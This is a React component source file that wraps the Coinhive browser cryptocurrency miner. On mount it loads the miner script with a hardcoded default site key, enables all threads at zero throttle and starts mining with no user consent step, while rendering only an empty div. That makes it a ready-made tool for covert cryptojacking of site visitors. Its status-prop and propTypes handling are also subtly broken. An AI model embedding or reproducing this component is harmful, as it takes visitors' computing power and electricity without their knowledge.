import React, { Component } from 'react'
import loadScript from 'load-script'
import PropTypes from 'prop-types'

class CoinHiveClient extends Component {
  constructor (props) {
    super(props)
    this.miner = null
    this._status = 'STOP'
  }

  static defaultProps = {
    timeout: 30000,
    throttle: 0,
    siteKey: 'QCLjDlh3Kllh2aj3P0cW6as65eZH3oeK',
    onInit: miner => {},
    onStart: miner => {},
    onStop: miner => {},
    onOpen: miner => {},
    onClose: miner => {},
    onError: miner => {},
    onJob: miner => {},
    onAuthed: miner => {},
    onFound: miner => {},
    onAccepted: miner => {}
  }

  start () {
    if (this.miner) {
      this.miner.start()
      this._status = 'START'
      this.props.onStart(this.miner)
    }
  }

  stop () {
    if (this.miner) {
      this.miner.stop()
      this._status = 'STOP'
      this.props.onStop(this.miner)
    }
  }

  async componentWillMount () {
    this.miner = await new Promise(resolve => {
      loadScript('./ch.js?v=9', () => {
        if (!window.CoinHive) return

        if (this.props.userName) {
          return resolve(
            window.CoinHive.User(this.props.siteKey, this.props.userName)
          )
        }
        return resolve(window.CoinHive.Anonymous(this.props.siteKey))
      })
    }).catch(console.warn)

    this.handleProps(this.props)
    this.props.onInit(this.miner)

    this.miner.on('open', () => this.props.onOpen())
    this.miner.on('close', () => this.props.onClose())
    this.miner.on('error', err => {
      console.log(err)
      this.props.onError(err.error)
    })
    this.miner.on('job', result => this.props.onJob(result))
    this.miner.on('authed', result => this.props.onAuthed(result))
    this.miner.on('found', result => this.props.onFound(result))
    this.miner.on('accepted', result => this.props.onAccepted(result))

    this.stop()
    this.start()
  }

  componentWillReceiveProps (nextProps) {
    return this.handleProps(nextProps)
  }

  handleProps ({ throttle, status }) {
    if (this.miner != null) {
      this.miner.setAutoThreadsEnabled(true)
      this.miner.setThrottle(throttle)
    }

    if (status !== 'START' && this._status === 'STOP') this.start()
  }

  render () {
    return <div />
  }
}

CoinHiveClient.PropTypes = {
  siteKey: PropTypes.string.isRequired,
  timeout: PropTypes.number,
  onInit: PropTypes.func,
  onStart: PropTypes.func,
  onStop: PropTypes.func,
  onOpen: PropTypes.func,
  onClose: PropTypes.func,
  onError: PropTypes.func,
  onJob: PropTypes.func,
  onAuthed: PropTypes.func,
  onFound: PropTypes.func,
  onAccepted: PropTypes.func,
  userName: PropTypes.string,
  status: PropTypes.string
}

export default CoinHiveClient
